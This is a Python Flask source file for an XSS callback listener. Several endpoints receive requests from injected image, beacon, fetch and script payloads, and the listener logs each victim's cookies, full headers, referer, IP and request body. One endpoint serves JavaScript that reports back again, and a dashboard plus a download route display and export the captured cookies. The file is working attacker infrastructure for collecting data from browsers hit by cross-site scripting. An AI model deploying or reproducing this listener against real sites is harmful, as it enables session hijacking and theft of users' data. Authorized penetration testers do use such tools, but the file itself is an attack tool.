from flask import Flask, request, Response
import datetime, os, json

app = Flask(__name__)

LOG_FILE = os.environ.get("LOG_FILE", "xss_log.jsonl")
# 1x1 transparent GIF — returned for <img> callbacks so the page doesn't error
PIXEL = bytes.fromhex(
    "47494638396101000100800000000000ffffff21f90401000000002c"
    "00000000010001000002024401003b"
)


def log_hit(kind):
    """Write one JSON line per callback. Never blocks the response."""
    entry = {
        "ts":        datetime.datetime.utcnow().isoformat() + "Z",
        "kind":      kind,                          # img | beacon | fetch | script | dom
        "tag":       request.args.get("v", "-"),    # your unique payload tag
        "url":       request.url,
        "path":      request.path,
        "ip":        request.headers.get("X-Forwarded-For",
                      request.headers.get("CF-Connecting-IP", request.remote_addr)),
        "method":    request.method,
        "referer":   request.headers.get("Referer", "-"),
        "origin":    request.headers.get("Origin", "-"),
        "ua":        request.headers.get("User-Agent", "-"),
        "cookies":   request.headers.get("Cookie", "-"),
        "accept":    request.headers.get("Accept", "-"),
        "sec_fetch": request.headers.get("Sec-Fetch-Site", "-"),
        "body":      request.get_data(as_text=True)[:1000],
        "headers":   dict(request.headers),
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    # Print to stdout too so you see it live in the terminal
    print(f"[HIT] {entry['ts']} kind={kind} tag={entry['tag']} "
          f"ref={entry['referer'][:80]} ip={entry['ip']}", flush=True)


# ---------- callback endpoints ----------

@app.route("/xss-catch")
def xss_catch():
    """Generic endpoint — works for fetch(), Image(), beacon, script src."""
    log_hit("generic")
    # If the payload is <img src=...>, return a real image
    if "image" in (request.headers.get("Accept") or "").lower():
        return Response(PIXEL, mimetype="image/gif")
    # If the payload is <script src=...>, return JS
    return Response("//ok", mimetype="application/javascript")


@app.route("/xss-img")
def xss_img():
    """Image-only callback — always returns a 1x1 GIF."""
    log_hit("img")
    return Response(PIXEL, mimetype="image/gif")


@app.route("/xss-beacon")
def xss_beacon():
    """navigator.sendBeacon() callback — POST."""
    log_hit("beacon")
    return ("", 204)


@app.route("/xss-js")
def xss_js():
    """Script src callback — returns JS that also reports back once."""
    log_hit("script")
    return Response(
        "try{fetch('/xss-catch?v=' + "
        "(new URLSearchParams(location.search).get('v') || 'js2'))}catch(e){}",
        mimetype="application/javascript",
    )


# ---------- viewer ----------

@app.route("/")
def home():
    if not os.path.exists(LOG_FILE):
        return "<h1>Listener running</h1><p>No hits yet.</p>"

    rows = []
    with open(LOG_FILE) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                rows.append(json.loads(line))
            except json.JSONDecodeError:
                continue

    rows.reverse()  # newest first
    html = [
        "<html><head><title>XSS Hits</title>",
        "<style>body{font:13px monospace;background:#111;color:#eee;padding:20px}"
        "table{border-collapse:collapse;width:100%}"
        "td,th{border:1px solid #333;padding:4px 8px;text-align:left;vertical-align:top}"
        "th{background:#222}tr:nth-child(even){background:#181818}"
        ".tag{color:#ff0}.ref{color:#0f0}.ua{color:#999;font-size:11px}</style>",
        "</head><body>",
        f"<h2>{len(rows)} hits — {LOG_FILE}</h2>",
        "<table><tr><th>time</th><th>tag</th><th>kind</th>"
        "<th>referer</th><th>ip</th><th>ua</th><th>cookies</th></tr>",
    ]
    for r in rows:
        html.append(
            "<tr>"
            f"<td>{r.get('ts','')}</td>"
            f"<td class=tag>{r.get('tag','')}</td>"
            f"<td>{r.get('kind','')}</td>"
            f"<td class=ref>{r.get('referer','')}</td>"
            f"<td>{r.get('ip','')}</td>"
            f"<td class=ua>{r.get('ua','')[:80]}</td>"
            f"<td class=ua>{(r.get('cookies','') or '')[:80]}</td>"
            "</tr>"
        )
    html.append("</table></body></html>")
    return "\n".join(html)


# ---------- raw log download ----------

@app.route("/log")
def raw_log():
    if not os.path.exists(LOG_FILE):
        return ("", 204)
    with open(LOG_FILE) as f:
        body = f.read()
    return Response(body, mimetype="application/x-ndjson",
                    headers={"Content-Disposition": "attachment; filename=xss_log.jsonl"})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
